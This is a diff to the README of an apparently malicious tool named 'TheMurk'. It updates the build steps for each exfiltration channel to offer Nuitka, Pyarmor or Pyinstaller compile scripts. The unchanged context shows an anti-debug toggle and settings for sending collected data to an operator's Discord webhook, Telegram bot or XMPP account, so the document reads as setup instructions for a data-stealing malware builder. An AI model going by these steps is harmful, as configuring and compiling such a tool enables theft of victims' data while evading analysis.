@@ -141,7 +141,7 @@ debuging = False #disable AntiDebug
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 discordData = ["url of your WebHook","name of that WebHook"]
 ```
-and run `Compile.bat`
+and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
 
 ### 📨For Telegram
 Finally, insert the name and webhook link in the `TheMurk.py` here
@@ -154,7 +154,7 @@ debuging = False #disable AntiDebug
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
 ```
-and run `Compile.bat`
+and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
 
 ### 📡For XMPP
 Finally, insert the name and webhook link in the `TheMurk.py` here
@@ -167,7 +167,7 @@ debuging = False #disable AntiDebug
 sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
 xmppData = ["jabberid","jabberpassword","jabberreceiver"]
 ```
-and run `Compile.bat`
+and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`
 
 ---
 ### ❌Builder errors
